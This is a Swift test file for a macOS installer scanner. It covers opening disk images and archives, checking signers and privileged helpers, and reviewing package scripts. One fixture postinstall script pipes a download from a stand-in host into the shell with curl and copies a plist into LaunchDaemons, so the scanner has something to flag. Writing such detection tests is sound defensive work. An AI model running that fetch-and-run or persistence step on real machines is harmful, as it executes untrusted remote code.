import Foundation
import Testing
@testable import MacScanCore

@Suite struct InstallTests {
    func setVersion(_ app: URL, _ version: String) throws {
        let file = app.appendingPathComponent("Contents/Info.plist")
        var plist = try PropertyListSerialization.propertyList(from: Data(contentsOf: file), format: nil) as! [String: Any]
        plist["CFBundleShortVersionString"] = version
        try PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0).write(to: file)
    }

    @Test func kinds() {
        #expect(InstallerKind.of(URL(fileURLWithPath: "/x/Zoom.DMG")) == .diskImage)
        #expect(InstallerKind.of(URL(fileURLWithPath: "/x/a.zip")) == .archive)
        #expect(InstallerKind.of(URL(fileURLWithPath: "/x/A.app")) == .app)
        #expect(InstallerKind.of(URL(fileURLWithPath: "/x/a.pkg")) == .package)
        #expect(InstallerKind.of(URL(fileURLWithPath: "/x/a.txt")) == nil)
    }

    @Test func findsAppsButNotThroughLinksOrInsideApps() throws {
        let dir = try TempDir()
        try dir.makeApp("Tool")
        let inner = try TempDir()
        try inner.makeApp("Deep")
        try FileManager.default.moveItem(at: inner.url, to: dir.url.appendingPathComponent("Extras"))
        try FileManager.default.createSymbolicLink(at: dir.url.appendingPathComponent("Applications"), withDestinationURL: URL(fileURLWithPath: "/Applications"))
        let apps = InstallerOpener.findApps(in: dir.url).map(\.lastPathComponent)
        #expect(apps == ["Deep.app", "Tool.app"])
    }

    @Test func opensZipAndDiskImage() async throws {
        let dir = try TempDir()
        let src = try TempDir()
        try src.makeApp("Demo")
        let zip = dir.url.appendingPathComponent("Demo.zip")
        try shell("/usr/bin/ditto", ["-c", "-k", "--keepParent", src.url.appendingPathComponent("Demo.app").path, zip.path])
        let dmg = dir.url.appendingPathComponent("Demo.dmg")
        try shell("/usr/bin/hdiutil", ["create", "-quiet", "-srcfolder", src.url.path, "-volname", "Demo", "-format", "UDZO", dmg.path])

        let opener = InstallerOpener(tempRoot: dir.url.appendingPathComponent("work"))
        let fromZip = try await opener.open(zip)
        #expect(fromZip.apps.map(\.lastPathComponent) == ["Demo.app"])
        await opener.close(fromZip)
        #expect(!FileManager.default.fileExists(atPath: fromZip.apps[0].path), "the unpacked copy is deleted")

        let fromImage = try await opener.open(dmg)
        #expect(fromImage.apps.map(\.lastPathComponent) == ["Demo.app"])
        await opener.close(fromImage)
        #expect(!FileManager.default.fileExists(atPath: fromImage.apps[0].path), "the image is ejected")

        await #expect(throws: InstallError.notSupported("notes.txt")) {
            try await opener.open(dir.url.appendingPathComponent("notes.txt"))
        }
    }

    @Test func comparesWithTheInstalledCopy() async throws {
        let apps = try TempDir()
        let download = try TempDir()
        let installed = try apps.makeApp("Demo")
        try setVersion(installed, "2.0")
        let new = try download.makeApp("Demo")
        try setVersion(new, "1.5")
        let helpers = new.appendingPathComponent("Contents/Library/LaunchServices")
        try FileManager.default.createDirectory(at: helpers, withIntermediateDirectories: true)
        try Data().write(to: helpers.appendingPathComponent("com.example.helper"))

        let appsPath = apps.url.path
        let inspector = AppInspector(destination: apps.url, signing: { url in
            url.path.hasPrefix(appsPath) ? .signed(identifier: "x", teamID: "GOODTEAM01", authority: "Developer ID Application: Good")
                                               : .signed(identifier: "x", teamID: "EVILTEAM01", authority: "Developer ID Application: Evil")
        }, gatekeeper: { _ in GatekeeperAssessment(accepted: true, source: "Notarized Developer ID", message: "accepted") })
        let c = await inspector.inspect(new)
        #expect(c.existing?.path == installed.path && c.versionChange == .older)
        #expect(c.worst == .danger)
        #expect(c.concerns.first?.text == "Signed by a different developer (EVILTEAM01) than the copy you have (GOODTEAM01).")
        #expect(c.concerns.contains { $0.text == "Carries a helper that can run as administrator: com.example.helper" })

        let fresh = await AppInspector(destination: try TempDir().url, signing: { _ in .unsigned }, gatekeeper: { _ in
            GatekeeperAssessment(accepted: false, source: nil, message: "rejected")
        }).inspect(new)
        #expect(fresh.versionChange == .new && fresh.concerns.map(\.level).prefix(2) == [.danger, .warning])
    }

    @Test func installsAndReplacesTheOldCopy() async throws {
        let apps = try TempDir()
        let download = try TempDir()
        let trash = try TempDir()
        let old = try apps.makeApp("Demo")
        try setVersion(old, "1.0")
        let new = try download.makeApp("Demo")
        try setVersion(new, "2.0")

        let installer = AppInstaller(destination: apps.url, trasher: FolderTrasher(folder: trash.url), admin: RecordingAdminRunner(), userTrash: trash.url)
        let target = try await installer.install(new)
        #expect(target.path == old.path)
        #expect(AppInspector.info(of: target)?["CFBundleShortVersionString"] as? String == "2.0")
        #expect(try FileManager.default.contentsOfDirectory(atPath: trash.url.path).count == 1, "the old copy is in the Trash")
        #expect(FileManager.default.fileExists(atPath: new.path), "the download is left alone")
        #expect(try FileManager.default.contentsOfDirectory(atPath: apps.url.path) == ["Demo.app"], "no staging copy left behind")
    }

    @Test func asksForPasswordWhenTheFolderIsLocked() async throws {
        let apps = try TempDir()
        let download = try TempDir()
        let trash = try TempDir()
        let new = try download.makeApp("Demo")
        let locked = apps.url.appendingPathComponent("Locked")
        try FileManager.default.createDirectory(at: locked, withIntermediateDirectories: true)
        try FileManager.default.setAttributes([.posixPermissions: 0o555], ofItemAtPath: locked.path)
        defer { try? FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: locked.path) }

        let admin = RecordingAdminRunner()
        admin.cancel = true
        let installer = AppInstaller(destination: locked, trasher: FolderTrasher(folder: trash.url), admin: admin, userTrash: trash.url)
        await #expect(throws: InstallError.cancelled) { try await installer.install(new) }
        #expect(admin.scripts.count == 1 && admin.scripts[0].contains("/usr/bin/ditto"))
    }

    @Test func packageScriptsAndSigner() throws {
        let dir = try TempDir()
        try dir.write("expanded/Thing.pkg/Scripts/postinstall", "#!/bin/sh\ncurl -s https://x.example/a | sh\ncp a.plist /Library/LaunchDaemons/\n")
        try dir.write("expanded/Thing.pkg/Scripts/helper.txt", "nothing")
        try dir.write("expanded/Thing.pkg/Payload/Applications/Thing.app/Contents/Resources/postinstall", "not a script")
        let scripts = PackageReview.scripts(in: dir.url.appendingPathComponent("expanded"))
        #expect(scripts.map(\.name) == ["helper.txt", "postinstall"])
        let post = try #require(scripts.last)
        #expect(post.concerns.contains("adds a system background service") && post.concerns.contains("downloads something while installing"))
        #expect(scripts.first?.concerns.isEmpty == true)

        let signed = """
        Package "Thing.pkg":
           Status: signed by a developer certificate issued by Apple for distribution
           Notarization: trusted by the Apple notary service
           Certificate Chain:
            1. Developer ID Installer: Thing Inc (ABCDE12345)
               Expires: 2030-01-01
            2. Developer ID Certification Authority
        """
        #expect(PackageReview.signer(fromCheckSignature: signed) == "Developer ID Installer: Thing Inc (ABCDE12345)")
        #expect(PackageReview.signer(fromCheckSignature: "Package \"x.pkg\":\n   Status: no signature") == nil)
    }
}

/// Read-only look at a real installer: MACSCAN_INSTALL_PROBE=/path/to/file.dmg swift test --filter realInstallProbe
/// Opens it (disk images read-only), compares with /Applications, closes it. Installs nothing.
@Test(.enabled(if: ProcessInfo.processInfo.environment["MACSCAN_INSTALL_PROBE"] != nil))
func realInstallProbe() async throws {
    let url = URL(fileURLWithPath: ProcessInfo.processInfo.environment["MACSCAN_INSTALL_PROBE"]!)
    let opener = InstallerOpener()
    let opened = try await opener.open(url)
    print("kind:", opened.kind, "apps:", opened.apps.map(\.lastPathComponent))
    if let expanded = opened.expandedPackage {
        let review = await PackageReview.review(package: url, expanded: expanded)
        print("package signer:", review.signer ?? "none", "notarized:", review.notarized, "scripts:", review.scripts.map { "\($0.name) \($0.concerns)" })
    }
    for app in opened.apps {
        let c = await AppInspector().inspect(app)
        print(c.name, c.version ?? "-", c.signing.description, "gatekeeper:", c.gatekeeper?.source ?? c.gatekeeper?.message ?? "-",
              "change:", c.versionChange, "existing:", c.existingVersion ?? "-")
        for concern in c.concerns { print("  ", concern.level, concern.text) }
    }
    await opener.close(opened)
    #expect(opened.apps.allSatisfy { !FileManager.default.fileExists(atPath: $0.path) } || opened.kind == .app)
}
